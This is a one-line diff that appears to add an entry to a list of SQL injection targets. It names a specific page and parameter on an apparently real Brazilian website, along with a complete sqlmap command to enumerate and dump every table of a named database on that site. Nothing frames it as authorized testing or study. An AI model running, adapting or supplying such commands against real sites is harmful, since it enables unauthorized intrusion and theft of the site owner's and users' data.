@@ -1,0 +1,1 @@
+http://www.dege.com.br/detalhes-noticias.php?valor=33 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.dege.com.br/detalhes-noticias.php?valor=33 -D degecom_sitedege --tables --dump-all
